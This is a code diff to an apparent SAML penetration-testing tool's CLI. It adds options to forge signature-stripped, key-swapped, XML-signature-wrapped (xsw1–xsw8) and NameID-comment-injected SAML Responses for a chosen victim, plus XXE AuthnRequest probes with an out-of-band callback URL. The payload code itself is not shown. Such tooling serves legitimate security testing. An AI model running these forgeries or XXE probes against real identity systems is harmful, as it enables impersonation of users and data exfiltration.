@@ -674,71 +674,134 @@ def saml_forge(
         typer.Option(
             "--attack",
             help=(
-                "One of: strip_signature, downgrade_sig_alg, swap_key_info, "
-                "inject_nameid_comment, xsw1."
+                "strip_signature | downgrade_sig_alg | swap_key_info | "
+                "inject_nameid_comment | inject_nameid_attribute | "
+                "xsw1..xsw8 | xxe_external_entity | xxe_parameter_entity | "
+                "xxe_bounded_expansion"
             ),
         ),
     ],
     source: Annotated[
         Path | None,
-        typer.Option("--from-file", help="Path to an XML Response."),
+        typer.Option(
+            "--from-file",
+            help="Path to an XML Response (required for strip/downgrade/swap/xsw/comment).",
+        ),
     ] = None,
     attacker_cert_b64: Annotated[
         str | None,
         typer.Option("--attacker-cert-b64", help="Base64 cert for swap_key_info."),
     ] = None,
     victim: Annotated[
-        str | None, typer.Option("--victim", help="Victim NameID for inject_nameid_comment.")
+        str | None,
+        typer.Option("--victim", help="Victim NameID for inject_nameid_{comment,attribute}."),
     ] = None,
     suffix: Annotated[
         str, typer.Option("--suffix", help="Suffix after the injected comment.")
     ] = ".attacker.test",
     evil_name_id: Annotated[
         str | None,
-        typer.Option(
-            "--evil-name-id",
-            help="NameID to substitute in the evil assertion for xsw1.",
-        ),
+        typer.Option("--evil-name-id", help="NameID to substitute in the evil assertion for xsw*."),
     ] = None,
+    oob_url: Annotated[
+        str | None,
+        typer.Option("--oob-url", help="Out-of-band URL for XXE probes."),
+    ] = None,
+    issuer: Annotated[
+        str | None, typer.Option("--issuer", help="SP entity id for XXE AuthnRequest.")
+    ] = None,
+    acs_url: Annotated[
+        str | None, typer.Option("--acs-url", help="ACS URL for XXE AuthnRequest.")
+    ] = None,
+    destination: Annotated[
+        str | None,
+        typer.Option("--destination", help="IdP SSO endpoint (Destination) for XXE AuthnRequest."),
+    ] = None,
+    expansion_depth: Annotated[
+        int,
+        typer.Option(
+            "--expansion-depth",
+            help="Depth for xxe_bounded_expansion (clamped to 2..5 to avoid genuine DoS).",
+        ),
+    ] = 4,
 ) -> None:
-    """Forge a malicious SAML Response variant. Output goes to stdout."""
+    """Forge a malicious SAML Response variant or an XXE-flavoured AuthnRequest."""
     from .saml.forge import (
         SAMLForgeError,
+        XSW_VARIANTS,
         downgrade_sig_alg,
+        inject_nameid_attribute_comment,
         inject_nameid_comment,
         strip_signature,
         swap_key_info,
-        xsw1,
+        xxe_bounded_expansion,
+        xxe_external_entity,
+        xxe_parameter_entity,
     )
 
-    if source is None:
-        typer.secho(
-            "error: --from-file is required", fg=typer.colors.RED, err=True
-        )
-        raise typer.Exit(code=2)
+    def _require_xml() -> bytes:
+        if source is None:
+            typer.secho("error: --from-file is required", fg=typer.colors.RED, err=True)
+            raise typer.Exit(code=2)
+        return source.read_bytes()
 
-    xml = source.read_bytes()
+    def _require_xxe_params() -> tuple[str, str, str]:
+        missing = [
+            n
+            for n, v in (("--issuer", issuer), ("--acs-url", acs_url), ("--destination", destination))
+            if not v
+        ]
+        if missing:
+            typer.secho(
+                f"error: XXE attacks require {', '.join(missing)}",
+                fg=typer.colors.RED,
+                err=True,
+            )
+            raise typer.Exit(code=2)
+        return issuer, acs_url, destination  # type: ignore[return-value]
 
     try:
         if attack == "strip_signature":
-            out = strip_signature(xml)
+            out = strip_signature(_require_xml())
         elif attack == "downgrade_sig_alg":
-            out = downgrade_sig_alg(xml)
+            out = downgrade_sig_alg(_require_xml())
         elif attack == "swap_key_info":
             if not attacker_cert_b64:
                 typer.secho("--attacker-cert-b64 is required", fg=typer.colors.RED, err=True)
                 raise typer.Exit(code=2)
-            out = swap_key_info(xml, attacker_cert_b64)
+            out = swap_key_info(_require_xml(), attacker_cert_b64)
         elif attack == "inject_nameid_comment":
             if not victim:
                 typer.secho("--victim is required", fg=typer.colors.RED, err=True)
                 raise typer.Exit(code=2)
-            out = inject_nameid_comment(xml, victim, suffix=suffix)
-        elif attack == "xsw1":
+            out = inject_nameid_comment(_require_xml(), victim, suffix=suffix)
+        elif attack == "inject_nameid_attribute":
+            if not victim:
+                typer.secho("--victim is required", fg=typer.colors.RED, err=True)
+                raise typer.Exit(code=2)
+            out = inject_nameid_attribute_comment(_require_xml(), victim)
+        elif attack in XSW_VARIANTS:
             if not evil_name_id:
                 typer.secho("--evil-name-id is required", fg=typer.colors.RED, err=True)
                 raise typer.Exit(code=2)
-            out = xsw1(xml, evil_name_id)
+            out = XSW_VARIANTS[attack](_require_xml(), evil_name_id)
+        elif attack == "xxe_external_entity":
+            if not oob_url:
+                typer.secho("--oob-url is required", fg=typer.colors.RED, err=True)
+                raise typer.Exit(code=2)
+            iss, acs, dest = _require_xxe_params()
+            out = xxe_external_entity(oob_url=oob_url, issuer=iss, acs_url=acs, destination=dest)
+        elif attack == "xxe_parameter_entity":
+            if not oob_url:
+                typer.secho("--oob-url is required", fg=typer.colors.RED, err=True)
+                raise typer.Exit(code=2)
+            iss, acs, dest = _require_xxe_params()
+            out = xxe_parameter_entity(oob_url=oob_url, issuer=iss, acs_url=acs, destination=dest)
+        elif attack == "xxe_bounded_expansion":
+            iss, acs, dest = _require_xxe_params()
+            out = xxe_bounded_expansion(
+                issuer=iss, acs_url=acs, destination=dest, depth=expansion_depth
+            )
         else:
             typer.secho(f"unknown attack {attack!r}", fg=typer.colors.RED, err=True)
             raise typer.Exit(code=2)
